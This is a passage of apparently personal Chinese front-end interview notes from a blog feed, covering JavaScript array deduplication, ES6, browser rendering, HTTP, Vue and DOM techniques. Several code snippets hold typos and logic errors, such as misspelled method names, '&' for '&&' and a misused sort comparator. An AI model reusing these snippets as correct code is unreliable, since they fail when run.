项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。</p><pre><code>function unique2(arr){  var hash=[];  for (var i = 0; i &lt; arr.length; i++) {     if(arr.indexOf(arr[i])==i){      hash.push(arr[i]);     }  }  return hash;}</code></pre><ol start="3"><li>排序后相邻去除</li></ol><p>实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值</p><pre><code>function unique3(arr){  arr.sort();  var hash=[arr[0]];  for (var i = 1; i &lt; arr.length; i++) {     if(arr[i]!=hash[hash.length-1]){      hash.push(arr[i]);     }  }  return hash;}</code></pre><ol start="4"><li>优化遍历数组法</li></ol><p>实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length</p><p>将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）</p><pre><code>function unique4(arr){  var hash=[];  for (var i = 0; i &lt; arr.length; i++) {    for (var j = i+1; j &lt; arr.length; j++) {      if(arr[i]===arr[j]){        ++i;      }    }      hash.push(arr[i]);  }  return hash;}</code></pre><ol start="5"><li>set</li></ol><pre><code>let arr = [4, 1, 3, 3, 2, '2'];let uniqueArr = [...new Set(arr)];console.log(uniqueArr); // [4, 1, 3, 2, "2"]</code></pre><h3 id="数组常用方法"><a href="#数组常用方法" class="headerlink" title="数组常用方法"></a>数组常用方法</h3><pre><code>split()//字符串 -&gt;数组转换join()//数组 -&gt;字符串转换, 转换时可以添加符号, 还有一个是toString()indexOf()  //查找元素返回第一个与参数相同的元素的索引。有另外函数 lastIndexOf()，  //该函数返回相同元素中最后一个元素的索引，如果没找到相同元素，则返回 -1push()pop()unshift()shift()concat()splice()reverse()sort()forEach()every()some()reduce(function (runningTotal, currentValue) {  return runningTotal +   currentValue;})//reduceRight()map()filter()</code></pre><ul><li>查找数组重复项</li></ul><ol><li>利用sort方法，先使用sort方法将数组排序，再来判断找出重复元素</li></ol><pre><code>// arrayObject.sort(sortby) 可选参数sortby，必须是函数function  res(arr){    var temp = [];    //    排序之后 相邻对比    arr.sort().sort(function(a,b){        if(a === b&amp;temp.indexOf(a)===-1){            temp.push(a)        }    })    return temp;}var arr = [1,2,3,3,3,3,4,4,5,6,7,7,9,5,4,3,7,7]console.log(arr.sort())console.log(res(arr));</code></pre><ul><li>扁平化数组</li></ul><ul><li>按数组中各项和特定值差值排序</li></ul><p>##26、BOM(Browser Object Model)属性对象方法</p><p>##27、服务端渲染<br>##28、垃圾回收机制<br>##29、eventloop<br>进程和线程<br>任务队列<br>##30、如何快速让字符串变成已千为精度的数字</p><p>#ES6</p><p>##1、声明 let、const</p><ul><li>let声明了一个块级作用域的变量，同一个函数或同一个作用域用let重复定义一个变量会typeError</li><li>const声明的变量不能改变值，必须立刻初始化</li></ul><p>##2、解构赋值<br>解构赋值语法是一个种js表达式，通过结构赋值，可将<strong>属性/值</strong>从<strong>对象/数组</strong>中取出，赋值给其他变量</p><p>###数组解构</p><pre><code>let [a, b, c] = [1, 2, 3] //a = 1, b = 2, c = 3let [d, [e], f] = [1, [2], 3] // 嵌套数组解构 d=1, e=2, f=3let [g, ...h] = [1, 2, 3] //数组拆分 g=1, h=[2, 3]let [i,,j] = [1, 2, 3]// 不连续解构 i=1, j=3let [k,l] = [1, 2, 3] // 不完全解构 k=1, l=2</code></pre><p>###对象解构</p><pre><code>let {a, b} = {a: 'aaaa', b: 'bbbb'} // a = 'aaaa' b='bbbb'let obj = {d: 'aaaa', e:{f: 'bbbb'}}let {d, e:{f}} = obj // 嵌套解构 d='aaaa' f='bbbb'let g;(g = {g: 'aaaa'})// 以声明变量解构 g= 'aaaa'let [h, i, j, k] = 'nice' // 字符串解构 h='n' i='i' j='c' k='e'</code></pre><p>##3、声明类与继承：class、extend</p><p>##4、Promise的使用与实现</p><p>##5、generator（异步编程、yield、next()、await 、async）</p><p>##6、箭头函数this指向问题、拓展运算符</p><p>##7、map和set有没有用过，如何实现一个数组去重，map数据结构有什么优点？</p><p>##8、ES6怎么编译成ES5,css-loader原理,过程</p><p>##9、ES6转成ES5的常见例子</p><p>使用es5实现es6的class</p><p>#浏览器</p><p>##1、输入url到展示页面过程发生了什么？</p><ol><li>浏览器会先把url域名解析成对应ip(DNS解析)</li><li>解析成ip之后建立与服务器的连接(三次握手)<br></li></ol><blockquote><ol><li>客户端发送syn包(syn=j)到服务器，并进入SYN_SENT状态，等待服务器确认</li><li>服务器收到syn包，必须确认客户的SYN(ack=j+1),同时自己也发送一个SYN包(syn=k),即SYN+ACK包，此时服务器进入SYN_RECV状态</li><li>客户端收到服务器的SYN+ACK包，向服务器发送确认包(ack=k+1)<br>成功之后客户端和服务器进入ESTABLISHED状态，完成三次握手<br>三次握手的目的是为了防止已失效的连接请求报文段突然又传到了服务端，因而产生错误</li></ol></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/3871772-948476074feb71ed.png?imageMogr2/auto-orient/" alt="三次握手"><br>3. 与服务器建立连接之后，发送请求<br>4. 服务器接受请求之后，处理请求并完成响应<br>5. 浏览器的接受数据和页面渲染，构建DOM树</p><blockquote><ol><li>根据 HTML 解析 DOM 树<br><br> 根据 HTML 的内容，将标签按照结构解析成为 DOM 树，DOM 树解析的过程是一个深度优先遍历。即先构建当前节点的所有子节点，再构建下一个兄弟节点。<br><br> 在读取 HTML 文档，构建 DOM 树的过程中，若遇到 script 标签，则 DOM 树的构建会暂停，直至脚本执行完毕。</li><li>根据 CSS 解析生成 CSS 规则树<br><br> 解析 CSS 规则树时 js 执行将暂停，直至 CSS 规则树就绪。<br>    浏览器在 CSS 规则树生成之前不会进行渲染。</li><li>结合 DOM 树和 CSS 规则树，生成渲染树<br><br> DOM 树和 CSS 规则树全部准备好了以后，浏览器才会开始构建渲染树。<br> 精简 CSS 并可以加快 CSS 规则树的构建，从而加快页面相应速度。</li><li>根据渲染树计算每一个节点的信息（布局）<br><br> 布局：通过渲染树中渲染对象的信息，计算出每一个渲染对象的位置和尺寸<br> 回流：在布局完成后，发现了某个部分发生了变化影响了布局，那就需要倒回去重新渲染。</li><li>根据计算好的信息绘制页面<br><br> 绘制阶段，系统会遍历呈现树，并调用呈现器的“paint”方法，将呈现器的内容显示在屏幕上。<br><br> 重绘：某个元素的背景颜色，文字颜色等，不影响元素周围或内部布局的属性，将只会引起浏览器的重绘。<br><br> 回流：某个元素的尺寸发生了变化，则需重新计算渲染树，重新渲染。</li></ol></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/3871772-21d4089079eae37a.png?imageMogr2/auto-orient/" alt="页面渲染"><br>6. 关闭TCP连接(四次挥手)<br><img src="https://upload-images.jianshu.io/upload_images/3871772-a0ba339fbd06fdba.png?imageMogr2/auto-orient/" alt="四次挥手"></p><blockquote><p>1.发起方向被动方发送报文，Fin、Ack、Seq，表示已经没有数据传输了。并进入 FIN_WAIT_1 状态。(第一次挥手：由浏览器发起的，发送给服务器，我请求报文发送完了，你准备关闭吧)</p></blockquote><blockquote><p>2.被动方发送报文，Ack、Seq，表示同意关闭请求。此时主机发起方进入 FIN_WAIT_2 状态。(第二次挥手：由服务器发起的，告诉浏览器，我请求报文接受完了，我准备关闭了，你也准备吧)</p></blockquote><blockquote><p>3.被动方向发起方发送报文段，Fin、Ack、Seq，请求关闭连接。并进入 LAST_ACK 状态。(第三次挥手：由服务器发起，告诉浏览器，我响应报文发送完了，你准备关闭吧)</p></blockquote><blockquote><p>4.发起方向被动方发送报文段，Ack、Seq。然后进入等待 TIME_WAIT 状态。被动方收到发起方的报文段以后关闭连接。发起方等待一定时间未收到回复，则正常关闭。(第四次挥手：由浏览器发起，告诉服务器，我响应报文接受完了，我准备关闭了，你也准备吧)</p></blockquote><p>##2、重绘与回流<br>重绘(repaint): 当元素样式的改变不影响布局时，浏览器将使用重绘对元素进行更新，此时由于只需要UI层面的重新像素绘制，因此 损耗较少<br>回流(reflow): 当元素的尺寸、结构或触发某些属性时，浏览器会重新渲染页面，称为回流。此时，浏览器需要重新经过计算，计算后还需要重新页面布局，因此是较重的操作。会触发回流的操作:</p><p>页面初次渲染<br>浏览器窗口大小改变<br>元素尺寸、位置、内容发生改变<br>元素字体大小变化<br>添加或者删除可见的 dom 元素<br>激活 CSS 伪类（例如：:hover）<br>查询某些属性或调用某些方法<br>clientWidth、clientHeight、clientTop、clientLeft<br>offsetWidth、offsetHeight、offsetTop、offsetLeft<br>scrollWidth、scrollHeight、scrollTop、scrollLeft<br>getComputedStyle()<br>getBoundingClientRect()<br>scrollTo()</p><p>回流必定触发重绘，重绘不一定触发回流。重绘的开销较小，回流的代价较高。<br>3、防抖与节流<br>4、cookies、session、sessionStorage、localStorage<br>5、浏览器内核<br>#服务端与网络<br>##1、常见状态码<br>##2、缓存<br>200 From cache和200 ok<br>400,401,403状态码分别代表什么<br>浏览器缓存<br>##3、cookie, session, token<br>##4、前端持久化的方式、区别<br>##5、DNS是怎么解析的</p><ol><li>用户主机上运行着DNS的客户端，就是我们PC机或者手机客户端运行着DNS客户端了</li><li>浏览器将接受到的url抽出域名字段，就是访问的主机名，比如<a href="http://www.baidu.com，并传给DNS应用的客户端" target="_blank" rel="noopener">www.baidu.com，并传给DNS应用的客户端</a></li><li>DNS客户端向DNS服务器端发送一份查询报文，报文中包含着要访问的主机名字段</li><li>DNS客户机最终会收到一份回答报文，其中包含有该主机名IP</li><li>一旦浏览器收到了DNSip地址，就可以向IP地址定位的HTTP服务器发起TCP链接</li></ol><p>##6、cdn<br>##7、计算机网络的相关协议<br>##8、http/https/http2.0<br>##9、get post区别</p><ol><li>GET后退按钮/刷新无害，而POST会重新提交数据</li><li>GET书签可收藏，POST为书签不可收藏</li><li>GET能缓存，POST不能缓存</li><li>GET编码类型application/x-www-form-url，POST编码类型encodedapplication/x-www-form-urlencoded或multipart/form-data，为二级制数据使用多重编码</li><li>GET历史参数保留在浏览器历史中，POST参数不会保存在浏览器历史中</li><li>GET对数据有长度限制，发送数据的时候，GET方法向URL添加数据；URL长度是受限的，POST无限制</li><li>GET只允许ASCII字符。POST无限制，允许二进制数据</li><li>与POST相比，GET安全性差，明文发送 拼接URL</li><li>POST比GET安全，因为参数不会保存在浏览器历史或web服务器日志中</li><li>ET的数据在URL中对所有人都是可见的。POST的数据不会显示在URL中</li></ol><p>##10、ajax、 axios库</p><pre><code>axios.get(url,{    params: {        ID: 123456    }}).then(function(res) {    console.log(res)}).catch((err)=&gt; {    console.log(err)})</code></pre><pre><code>axios.request(config)axios.get(url[, config])axios('/user/12345', {  method: 'get',  params: {    firstName: 'Fred',    lastName: 'Flintstone'  }});axios.post(url[, data[, config]])axios.delete(url[, config])axios.head(url[, config])axios.put(url[, data[, config]])axios.patch(url[, data[, config]])</code></pre><p>##11、tcp三次握手，四次挥手流程</p><p>##12、跨域<br>##13、前端安全XSS、CSRF<br>##14、websocket<br>##15、Http请求中的keep-alive有了解吗<br>##16、网络分层<br>##17、即时通信，除了Ajax和websocket<br>##18、模块化，commonJS，es6，cmd，amd</p><p>#Vue</p><p>##1、vue解决了什么问题<br>解决了数据和控件双向绑定问题<br>##2、MVVM的理解<br>MVVM是Model-View-ViewModel的缩写，</p><p>优点: </p><ol><li>主要目的是分离视图和模型</li><li>降低代码耦合，提高视图或者逻辑的重用性</li><li>提高了模块的可测试性<br>##3、如何实现一个自定义组件，不同组件之间如何通信的？</li></ol><pre><code>&lt;template&gt;    &lt;div class="contact-list"&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default {        name: "contact-list",        props:['basicInfo'],    }&lt;/script&gt;&lt;style scoped lang="stylus" rel="stylesheet/stylus"&gt;    .contact-list        padding: 30px 0        text-align center        background-color: #2C8FA1&lt;/style&gt;</code></pre><p>父传子：父组件=&gt; :dataname=”dataname”<br>子组件 =&gt; props:[‘dataname’]</p><p>子传父：父组件=&gt; @eventName = “”<br>##4、nextTick</p><p>##5、生命周期<br>##6、虚拟dom的原理<br>##7、双向绑定的原理？数据劫持？<br>##8、组件通信<br>###父-&gt;子<br>###子-&gt;父<br>###非父子组件<br>##9、Proxy 相比于 defineProperty 的优势<br>##10、watch computed区别<br>##11、virtual dom 原理实现<br>##12、vue-router(hash， HTML5 新增的 pushState<br>单页应用，如何实现其路由功能—路由原理<br>vue-router如何做用户登录权限等<br>你在项目中怎么实现路由的嵌套</p><p>##13、vuex的理解</p><ol><li><p>Vuex是什么？怎么使用？哪种功能场景使用</p><p> Vuex是vue的状态管理。在main.js中引入stroe，注入新建目录store，….export。场景：单页应用中，组件之间的状态，音乐播放，登陆状态，加入购物车</p></li><li><p>Vuex有哪几种属性<br>Vuex有五种核心属性</p></li></ol><ul><li>state =&gt; 基本数据</li><li>getters =&gt; 从基本数据派生的数据</li><li>mutations =&gt; 提交更改数据的方法，同步</li><li>actions =&gt; 像一个装饰器，包裹mutations，使之可以异步</li><li>modules =&gt; 模块化Vuex</li></ul><ol start="3"><li>不用Vuex会有什么问题</li></ol><p>##14. 组件动态加载，组件懒加载<br>##15. 动态加载路由，路由懒加载</p><pre><code></code></pre><p>##16. watch里面有什么属性</p><ul><li>watch使用的几种方法</li></ul><ol><li><p>通过watch监听data数据变化，数据变化时会打印当前值</p><pre><code>watch: { data(val, newval) {     console.log(val);     console.log(newval); }}</code></pre></li><li><p>通过watch监听docData数据的变化，数据发生变化时，this.change_number++(使用深度监听)</p></li></ol><pre><code>watch: {    docData: {        handler(newVal) {            this.change_number++        },        deep: true    }}</code></pre><ol start="3"><li>通过watch监听data数据的变化，数据发生变化时，执行changeData方法</li></ol><pre><code>watch: {    data: 'changeData' // 值可以为methods的方法名},methods: {    changeData(curVal,oldVal) {        console.log(curVal,oldVal)    }}</code></pre><ul><li>详解watch中的immediate、handle和deep属性</li></ul><ol><li>immediate和handler</li></ol><p>这样使用watch时有一个特点，就是当值第一次绑定时，不会执行监听函数，只有值发生改变才会执行，如果我么需要最初绑定值的时候也执行函数，就需要<code>immeditae</code>属性</p><pre><code>watch: {    docData: {        handler(newVal) {            this.change_number++        },        immediate: true    }}</code></pre><ol start="2"><li>deep</li></ol><p>当需要监听一个对象的改变时，普通的watch方法无法监听到对象内部属性的改变，此时就需要deep对对象进行深度监测</p><pre><code>data (){    return {        docData: {            'doc_id': 1,            'tpl_data': 'abc'        }    }},watch: {    docData: {        handler(newVal) {            this.change_number++        },        deep: true    }}</code></pre><p>设置deep:true则可以监听到docData.doc_id的变化，此时会给docData所以属性都加上这个监听器，当对象属性较多时，每个属性值的变化都会执行handler，如果只需要监听对象中的一个属性值，则可以做一下优化：使用字符串的形式监听对象属性：</p><pre><code>data () {    return {        docData: {            'doc_id': 1,            'tpl_data': 'abc'        }    }},watch: {    'docData.doc_id': {        handler(newVal, oldVal) {            .......        },        deep: true;    }}</code></pre><p>#前端性能优化<br>##页面DOM节点太多，会出现什么问题？如何优化？<br>DOM太多会造成页面加载卡顿，</p><ul><li>操作DOM节点</li></ul><ol><li>在外部更新节点然后与原始节点互换<br>使用cloneNode在外部更新节点然后在通过replace替换</li></ol><pre><code>var orig = document.getElementById('cont');var clone = orig.cloneNode(true)var list = ['a','b'];var content;for(var i = 0;i&lt;list.length;i++){    content = document.createTextNode(list[i]);    clone.appendChild(content);}orig.parentNode.replaceChild(clone,orig)</code></pre><ol start="2"><li>在对DOM操作之前，把要操作的元素，先从当前DOM结构中删除，设置元素<code>display: none</code></li><li>DOM的多个读写操作，应该放在一起，并且不要在两个读操作之间加入一个写操作</li></ol><ul><li>新增DOM节点</li></ul><ol><li><p>在对当前DOM进行操作之前，尽可能多的做一些准备工作，保证N次创建，1次写入。优化的方法是创建DocumentFragment，在其中插入节点后再添加到页面。如JQuery中所有的添加节点的操作如append，都是最终调用DocumentFragment来实现的</p></li><li><p>添加结构外的元素尽量设置他们的位置为fixed或absolute</p></li><li><p>不要一条条的改变样式，而要通过改变class或者csstext属性，一次性改变样式</p></li><li><p>减少DOM元素数量，正面页面应小于1000</p></li></ol><pre><code>document.getElementsByTagName( '*' ).length</code></pre><ol start="5"><li>避免表格布局，重绘重排成本要高于div</li><li>把获取的DOM数据缓存起来</li></ol><pre><code>el.className += "theclassname";el.style.cssText += ";left:" + left + "px;top:" + top + "px"</code></pre><p>##如何做性能监测<br>##SEO和语义化<br>这个没被问过<br>#微信小程序<br>微信小程序和h5差异，如果有开发weex的经验，可能会加上weex<br>#git<br>一些基本命令<br>#打包工具webpack<br>1、打包原理<br>2、打包插件<br>3、webpack热更新原理<br>4、优化构建速度<br>#算法<br>##1、排序算法</p><p>2、动态规划，参见背包问题<br>3、二叉树<br>4、加油站问题(贪心算法)<br>5、二分法<br>6、二叉树遍历<br>7、单链表反转<br>8、取1000个数字里面的质数<br>9、找出数组中和为给定值的两个元素，如：[1, 2, 3, 4, 5]中找出和为6的两个元素。<br>10、线性顺序存储结构和链式存储结构有什么区别？以及优缺点<br>移动端<br>1、自适应<br>2、pwa<br>3、移动端手势<br>附加题<br>1、无限滚动方案<br>2、如何处理兼容性问题<br>3、你遇到过最难的问题是什么<br>4、ES6 class与ES5 function区别及联系<br>5、vue怎么监听数组<br>6、写过webpack loader吗<br>7、微信网页版登录机制思考</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>面试汇总</title>
      <link href="/2019/05/08/mian-shi-hui-zong/"/>
      <url>/2019/05/08/mian-shi-hui-zong/</url>
      
        <content type="html"><![CDATA[<p>#HTML题目<br>##1. meta viewport是干什么的</p><pre><code>&lt;meta name="viewport" content="width=device-width, initial-scale=1, maximun-scale=1"&gt;</code></pre><p>通过将初始缩放和最小缩放设置为0.86来限制一些智能手机的缩小操作。结果是水平滚动在任何方向都被抑制，用户可以根据需要放大。</p><pre><code>&lt;meta name="viewport" content="width=device-width, initial-scale=0.86, maximun-scale=3.0, minimum-scale=0.86"&gt;</code></pre><p>##2. 什么是函数式编程</p><p>抽象问题搜知乎，代码问题搜MDN stackoverflow或者博客</p><p>##3. 用过哪些html5标签<br>header main footer article<br>// 以下标签肯定会追问深入<br>canvas video audio<br>##4. html5新特性</p><ul><li>增加的标签</li></ul><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">header</td><td align="center">定义文档头部</td></tr><tr><td align="center">footer</td><td align="center">定义文档尾部</td></tr><tr><td align="center">nav</td><td align="center">定义文档导航</td></tr><tr><td align="center">section</td><td align="center">定义区块</td></tr><tr><td align="center">article</td><td align="center">定义页面独立的内容区域</td></tr><tr><td align="center">aside</td><td align="center">定义边栏</td></tr><tr><td align="center">details</td><td align="center">定义文档描述细节</td></tr><tr><td align="center">summary</td><td align="center">标签包含details元素标题</td></tr><tr><td align="center">dialog</td><td align="center">定义对话框，比如提示框</td></tr><tr><td align="center">canvas</td><td align="center">用于绘画的标签</td></tr><tr><td align="center">audio</td><td align="center">音频播放</td></tr><tr><td align="center">video</td><td align="center">视频播放</td></tr></tbody></table><ul><li>增强型表单type</li></ul><table><thead><tr><th align="center">输入类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">color</td><td align="center">选取颜色</td></tr><tr><td align="center">date</td><td align="center">从一个日期选择器选取一个日期</td></tr><tr><td align="center">datetime</td><td align="center">选择一个日期（UTC时间）</td></tr><tr><td align="center">datetime-local</td><td align="center">选择一个日期和时间（无时区）</td></tr><tr><td align="center">email</td><td align="center">包含一个邮件地址输入域</td></tr><tr><td align="center">month</td><td align="center">选择一个月份</td></tr><tr><td align="center">number</td><td align="center">数值的输入域</td></tr><tr><td align="center">range</td><td align="center">一定范围内的数字值输入域</td></tr><tr><td align="center">search</td><td align="center">用于搜索域</td></tr><tr><td align="center">tel</td><td align="center">定义输入电话字段</td></tr><tr><td align="center">time</td><td align="center">选择一个时间</td></tr><tr><td align="center">url</td><td align="center">URL地址的输入域</td></tr><tr><td align="center">week</td><td align="center">选择周和年</td></tr></tbody></table><ul><li>新增表单属性 </li></ul><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">placeholder</td><td align="center">输入框提示灰色字</td></tr><tr><td align="center">required</td><td align="center">boolean属性，要求输入域不为空</td></tr><tr><td align="center">pattern</td><td align="center">描述了一个正则用于验证input值</td></tr><tr><td align="center">min和max属性</td><td align="center">设置了元素的最小值最大值</td></tr><tr><td align="center">step</td><td align="center">为输入域规定合法数字间隔</td></tr><tr><td align="center">height和width</td><td align="center">用于image类型input图像高度宽度</td></tr><tr><td align="center">autofocus</td><td align="center">boolean属性，页面加载自动获得焦点</td></tr><tr><td align="center">multiple</td><td align="center">boolean属性，规定input元素可选择多个值</td></tr><tr><td align="center">##5. canvas动画</td><td align="center"></td></tr><tr><td align="center">标签只是容器，必须用js来绘制图形</td><td align="center"></td></tr></tbody></table><pre><code>// 创建画布标签&lt;canvas id="myCanvas" width="200px" height="200px" style="1px solid red"&gt;&lt;/canvas&gt;</code></pre><p>js才能绘图</p><pre><code>&lt;script&gt;    var myCanvas = document.getElementById("myCanvas");    var ctx = myCanvas.getContext('2d');    ctx.fillStyle = "blue";    ctx.fillRect(0,0,150,75)&lt;/script&gt;    </code></pre><p>#CSS<br>##1. 两种盒模型，浏览器内核<br>盒模型 | 结构<br>:-:|:-:<br>W3C标准盒模型 |<br>##2. 实现垂直居中</p><p>##3. flex怎么用</p><pre><code>&lt;div class='container'&gt;&lt;/div&gt;</code></pre><p>##4. BFC是啥<br>举例<br>##5. css优先级</p><table><thead><tr><th align="center">选择器</th><th align="center">符号</th></tr></thead><tbody><tr><td align="center">id</td><td align="center">#idName</td></tr><tr><td align="center">class</td><td align="center">.classname</td></tr><tr><td align="center">相邻选择器</td><td align="center">ul+div</td></tr><tr><td align="center">子选择器</td><td align="center">ul&gt;div</td></tr><tr><td align="center">后代选择器</td><td align="center">ul div</td></tr><tr><td align="center">通配符</td><td align="center">*</td></tr><tr><td align="center">属性选择器</td><td align="center">a[href=’xxx’]</td></tr><tr><td align="center">伪类选择器</td><td align="center">a:after a:hover</td></tr><tr><td align="center">##6. 清楚浮动</td><td align="center"></td></tr></tbody></table><pre><code>.clearfix {    content: '';    display: block;    clear: both;}</code></pre><p>#JavaScript题目<br>##1. ES6新特性</p><p>##2. Promise、Promise.all、Promise.race分别怎么用<br>##3.必考：手写函数防抖和函数节流<br>函数防抖和函数节流，都是优化高频率执行js代码的一种手段<br><br>函数节流实际应用场景，多数为监听页面元素滚动事件，示例代码</p><pre><code>// 函数节流var canRun = true;document.getElementById("throttle").onscroll = function (){    if (!canRun){    // 判断状态是否空闲，如果在执行中，直接return        return;    }    canRun = false;    setTimeout(function(){        console.log('函数节流')；        canRun = true    }, 300);}</code></pre><p>函数防抖是指对于事件被触发的一段时间后再进行的回调，如果这段时间又重新被触发，重新开始计时，适用于</p><ul><li>表单组件输入内容的验证</li><li>多次点击导致的表单多次提交优化</li></ul><pre><code>// 函数防抖function debounce(fn, wait) {    var timer = null;    return function(){        var context = this        var args = arguments        if (timer) {            clearTimeout(timer);            timer = null;        }        timer = setTimerout(function(){            fn.apply(context, args)        }, wait)    }}var fn = function (){    console.log('boom')}setInterval(debounce(fn, 500), 1000)</code></pre><p>##4.必考：手写AJAX</p><pre><code>var request = new XMLHttpRequest();request.open('GET','/xxxx')request.onreadystatechange = function () {    if (request.response.status &gt;= 200 &amp;&amp; request.response.status &lt; 300){    console.log('请求成功')    }else {        console.log('请求失败')    }}request.send()</code></pre><p>##5.必考：这段代码里的 this 是什么？</p><ol><li>fn()<br> this =&gt; window/global</li><li>obj.fn()<br> this =&gt; obj</li><li>fn.call(xx)<br> this =&gt; xx</li><li>fn.apply(xx)<br> this =&gt; xx</li><li>fn.bind(xx)<br>this =&gt; xx</li><li>new Fn()<br> this =&gt; 新的对象</li><li>fn = ()=&gt; {}<br> this =&gt; 外面的this</li></ol><p>##6.必考：闭包/立即执行函数是什么？</p><p>##7.必考：什么是 JSONP，什么是 CORS，什么是跨域？<br>##8.常考：async/await 怎么用，如何捕获异常？<br>##9.常考：如何实现深拷贝？</p><ol><li>递归</li><li>判断类型</li><li>检查循环引用（环）</li><li>不可能拷贝原型<em>proto</em><br>##10.常考：如何用正则实现 trim()？</li></ol><pre><code>function trim(string){    return string.replace(/^\s+|\s+$/g,'')}</code></pre><p>##11.常考：不用 class 如何实现继承？用 class 又如何实现？</p><pre><code>function Animal(``){    this.a = 1}Animal.prototype.move = function(){}function Dog(){    Animal.apply(this, arguments)    this.d = 2}let f = function(){}f.prototype = Animal.prototyoeDog.prototype = new f()Dog.prototype.constructor = DogDog.say = function(){}class Dog extends Animal{    constructor(){        super()    }}</code></pre><p>##12.常考：如何实现数组去重？</p><ol><li>hash</li><li>[…new Set(array)]</li><li>WeakMap<br>##13.放弃：== 相关题目（反着答）<br>##14.送命题：手写一个 Promise</li></ol><pre><code></code></pre><p>##15.js垃圾回收机制</p><p>window永远不会是垃圾，页面所有属性都挂载在window上面，全局变量<br>对象如果没有被引用，将会成为垃圾被回收，即使引用别人也不行<br><br>孤岛机制，环引用中 family=null 剩下的互相引用也会成为垃圾</p><p>垃圾回收机制 会从全局变量向下找，引用的对象会mark出来，全部mark之后，会将没有mark的部分视为垃圾清除<br>被成为 标记-清除算法（mark-sweep）<br>js为单线程，每次标记的时候会中断js的代码，<br>三种优化： </p><ol><li>new代 old代</li><li>增量执行，分批多次执行</li><li>空闲时间执行</li></ol><p>引用计数算法</p><p>#DOM面试题<br>##1. 事件委托</p><pre><code>ul.addEventListener('click', function(e){    if(e.target.tagName.toLowerCase() === 'li'){        fn()//执行某个函数    }})</code></pre><p>bug： 如果li里面有span被点击 无法穿透到li标签监测到被点击</p><pre><code>function delegate(element, eventType, selector,fn) {    element.addEventListener(eventType, e =&gt; {        let el = e.target        while(!el.mathes(selector)){            if(element === el) {                el = null                break            }            el = el.parentNode        }        el &amp; fn.call(el, e, el)    })    return element}</code></pre><p>这里思路为，点击span后，递归遍历span的祖先元素查看有没有ul里面的li，适用的事件 click，mousedown，mouseup，keydown，keyup，keypress。</p><p>##2. 实现一个可拖拽的div<br>HTML</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;meta charset="utf-8"&gt;  &lt;meta name="viewport" content="width=device-width"&gt;  &lt;title&gt;JS Bin&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="xxx"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>css</p><pre><code>div{  border: 1px solid red;  position: absolute;  top: 0;  left: 0;  width: 100px;  height: 100px;}*{margin:0; padding: 0;}</code></pre><p>js</p><pre><code>var dragging = false;var position = null;moveDiv.addEventListener('mousedown',function(e){  dragging = true;  position = [e.clientX,e.clientY]})document.addEventListener('mousemove',function(e){  if(dragging === false){    return  }  const x = e.clientX;  const y = e.clientY;  const newX = x - position[0];  const newY = y - position[1];  // 因为left top 自带px，需要转化成数字  const numLeft = parseInt(moveDiv.style.left || 0);  const numTop = parseInt(moveDiv.style.top || 0);  moveDiv.style.left = numLeft + newX + 'px';  moveDiv.style.top = numTop + newY +'px';  position = [x,y]  console.log(position)})document.addEventListener('mouseup',function(){  dragging = false;})</code></pre><p>#HTTP题目<br>##1. HTTP状态码有哪些?分别是什么意思</p><ul><li>2xx 表示成功</li><li>3xx 表示需要进一步操作</li><li>4xx 浏览器方面出错</li><li>5xx 表示服务器方面出错</li></ul><p>##2. HTTP缓存有哪几种</p><p>Etag、CacheControl、Expires的异同</p><p> <a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="noopener">详情</a></p><p>##ie css适配</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>面试整理</title>
      <link href="/2019/04/17/mian-shi-zheng-li/"/>
      <url>/2019/04/17/mian-shi-zheng-li/</url>
      
        <content type="html"><![CDATA[<p>#面试总结<br>##一、H5有哪些新特性<br>###新特性</p><ol><li>新的文档类型</li><li>脚本和链接无序type（比如加载js css等）</li><li>语义Header和Footer</li><li>video、audio简单的几行代码就行实际在线音视频播放</li><li>支持canvas和svg6 强大的表单验证功能和新表单标签type:”number/date/week/search”等<h3 id="标签兼容"><a href="#标签兼容" class="headerlink" title="标签兼容"></a>标签兼容</h3><pre><code>&lt;!--[if lt IE 9]&gt;&lt;script&gt; src="html5.js"&lt;/script&gt;&lt;![endif]--&gt; ```区分html和html5</code></pre></li></ol><p>文档声明html5头部声明很简单<br>利用标签区分很多html新增标签 canvas audio filedset video<br>##二、 浏览器内核有什么？如何解决兼容问题<br>###内核</p><ol><li>Trident内核 IE 360极速浏览器</li><li>Gecko内核 Firefox </li><li>webkit内核 safari</li><li>Blink Opera Chrome<br>###兼容问题</li><li>浏览器直接的margin和padding默认值不同<br>解决方案：css增加通配符* {margin: 0; padding: 0}</li><li>图片默认有间距<br>解决方案：使用float为img布局</li><li>IE9以下不能使用opacity<br>解决方案：</li></ol><pre><code>opacity: 0.5;filter: alpha(opacity = 50);filter: progid:DXImageTransform.Microsoft.Alpha(style = 0, opacity = 50);</code></pre><h2 